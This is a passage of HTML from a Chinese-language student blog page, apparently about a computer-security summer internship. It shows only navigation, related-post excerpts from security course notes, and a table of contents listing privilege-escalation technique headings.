src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/06/05/Computer-security-self-study/" title="自學電安的52周"><div class="cover" style="background: 縮略圖"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">自學電安的52周</div></div><div class="info-2"><div class="info-item-1">Computer Security Mastery Plan前言想在電腦安全的領域做更深入一點的研究，於是用GPT生成了一個自學計畫表(從最基礎的開始)，以此文章記錄每個階段的心得與結果  Structure 48 weeks total 4 Phases Weekly goals, study topics, hands-on labs, tools, and checklist Focus on implementation, CTF, malware, pentesting, exploit dev, and defensive engineering   Phase 1: FoundationGoals: Build strong OS, networking, crypto, and web security fundamentals. Topics &amp; Labs: OS/Linux fundamentals &amp; scripting TCP/IP, DNS, DHCP, NAT, VLANs Cryptography (XOR,...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/05/30/CSC-final/" title="電腦安全總整與實作期末筆記"><div class="cover" style="background: 縮略圖"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="info-item-2">電腦安全總整與實作期末筆記</div></div><div class="info-2"><div class="info-item-1">電腦安全總整與實作期末筆記Chapter 5: Database&amp;Cloud securityNeeds for Database SecurityDatabase security often lags behind the increasing reliance on databases due to:  Complexity of DBMS: Database Management Systems are complex, featuring many new services and sophisticated interaction protocols like SQL, which is more complex than HTTP. Mismatch in Capabilities: Administrators may have limited security knowledge or an incomplete understanding of DBMS. Heterogeneous Platforms: Databases operate...</div></div></div></a><a class="pagination-related" href="/2025/04/13/CSC-midterm/" title="電腦安全總整與實作期中筆記"><div class="cover" style="background: 縮略圖"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-13</div><div class="info-item-2">電腦安全總整與實作期中筆記</div></div><div class="info-2"><div class="info-item-1">電腦安全總整與實作期中筆記Chapter 1: OverviewThree components of computer security Confidentiality Information is not disclosed to unauthorized individuals Individuals control or influence what information related to them may be collected and stored   Integrity Information and programs are changed only in a specified and authorized manner   Availability Systems work promptly and service is not denied to authorized users    Threats and Attacks   Threat Consequence Attack Action Example    Unauthorized...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/crow.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">烏鴉先生</div><div class="author-info-description">隨手寫東西</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/WithoutDirection"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AD%E7%A0%94%E9%99%A2%E8%B3%87%E8%A8%8A%E6%89%80%E6%9A%91%E6%9C%9F%E5%AF%A6%E7%BF%92"><span class="toc-number">1.</span> <span class="toc-text">中研院資訊所暑期實習</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B3%E8%AB%8B"><span class="toc-number">1.2.</span> <span class="toc-text">申請</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%A6%E7%BF%92%E6%9C%AD%E8%A8%98"><span class="toc-number">1.3.</span> <span class="toc-text">實習札記</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Day-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">Day 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Day-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Day 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Day-3"><span class="toc-number">1.3.3.</span> <span class="toc-text">Day 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Day-4"><span class="toc-number">1.3.4.</span> <span class="toc-text">Day 4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BF%AB%E7%94%A8%E6%AC%8A%E9%99%90%E6%8F%90%E5%8D%87%E6%8E%A7%E5%88%B6%E6%A9%9F%E5%88%B6-Abuse-Elevation-Control-Mechanism"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">1. 濫用權限提升控制機制 (Abuse Elevation Control Mechanism)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AD%98%E5%8F%96%E6%AC%8A%E6%9D%96%E6%93%8D%E6%8E%A7-Access-Token-Manipulation"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">2. 存取權杖操控 (Access Token Manipulation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%96%8B%E6%A9%9F%E6%88%96%E7%99%BB%E5%85%A5%E6%99%82%E8%87%AA%E5%8B%95%E5%95%9F%E5%8B%95%E5%9F%B7%E8%A1%8C-Boot-or-Logon-Autostart-Execution"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">3. 開機或登入時自動啟動執行 (Boot or Logon Autostart Execution)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%BB%BA%E7%AB%8B%E6%88%96%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%B5%B1%E8%99%95%E7%90%86%E7%A8%8B%E5%BA%8F-Create-or-Modify-System-Process"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">4. 建立或修改系統處理程序 (Create or Modify System Process)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E4%BA%8B%E4%BB%B6%E8%A7%B8%E7%99%BC%E5%9F%B7%E8%A1%8C-Event-Triggered-Execution"><span class="toc-number">1.3.4.5.</span> <span class="toc-text">5. 事件觸發執行 (Event Triggered Execution)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%8A%AB%E6%8C%81%E5%9F%B7%E8%A1%8C%E6%B5%81%E7%A8%8B-Hijack-Execution-Flow"><span class="toc-number">1.3.4.6.</span> <span class="toc-text">6. 劫持執行流程 (Hijack Execution Flow)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E8%99%95%E7%90%86%E7%A8%8B%E5%BA%8F%E6%B3%A8%E5%85%A5-Process-Injection"><span class="toc-number">1.3.4.7.</span> <span class="toc-text">7. 處理程序注入 (Process Injection)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E6%8E%92%E7%A8%8B%E5%B7%A5%E4%BD%9C-%E4%BB%BB%E5%8B%99-Scheduled-Task-Job"><span class="toc-number">1.3.4.8.</span> <span class="toc-text">8. 排程工作/任務 (Scheduled Task/Job)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E6%9C%89%E6%95%88%E5%B8%B3%E6%88%B6-Valid-Accounts"><span class="toc-number">1.3.4.9.</span> <span class="toc-text">9. 有效帳戶 (Valid Accounts)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E7%B6%B2%E5%9F%9F%E6%94%BF%E7%AD%96%E4%BF%AE%E6%94%B9-Domain-Policy-Modification"><span class="toc-number">1.3.4.10.</span> <span class="toc-text">10. 網域政策修改 (Domain Policy Modification)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E8%88%87%E5%91%BD%E4%BB%A4%E5%8F%83%E8%80%83"><span class="toc-number">1.3.4.11.</span> <span class="toc-text">實用工具與命令參考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Day-6"><span class="toc-number">1.3.5.</span> <span class="toc-text">Day 6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%8F%AD%E4%B9%8B%E9%A4%98"><span class="toc-number">1.4.</span> <span class="toc-text">上班之餘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E7%A0%94%E5%92%96%E5%95%A1%E6%89%80"><span class="toc-number">1.4.1.</span> <span class="toc-text">中研咖啡所</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E5%90%89%E9%83%8E"><span class="toc-number">1.4.2.</span> <span class="toc-text">五吉郎</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%83%E5%BE%97"><span class="toc-number">1.5.</span> <span class="toc-text">心得</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/sinica-cs-summer-internship/" title="中研院資訊所暑期實習">中研院資訊所暑期實習</a><time datetime="2025-06-30T16:00:00.000Z" title="Created 2025-07-01 00:00:00">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/05/Computer-security-self-study/" title="自學電安的52周">自學電安的52周</a><time datetime="2025-06-05T11:01:23.631Z" title="Created 2025-06-05 19:01:23">2025-06-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/30/CSC-final/" title="電腦安全總整與實作期末筆記">電腦安全總整與實作期末筆記</a><time datetime="2025-05-29T16:00:00.000Z" title="Created 2025-05-30 00:00:00">2025-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/19/NA-midterm/" title="NA 期中大抄">NA 期中大抄</a><time datetime="2025-04-18T16:00:00.000Z" title="Created 2025-04-19 00:00:00">2025-04-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/13/CSC-midterm/" title="電腦安全總整與實作期中筆記">電腦安全總整與實作期中筆記</a><time datetime="2025-04-12T16:00:00.000Z" title="Created 2025-04-13 00:00:00">2025-04-13</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">©2019 - 2025 By 烏鴉先生</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>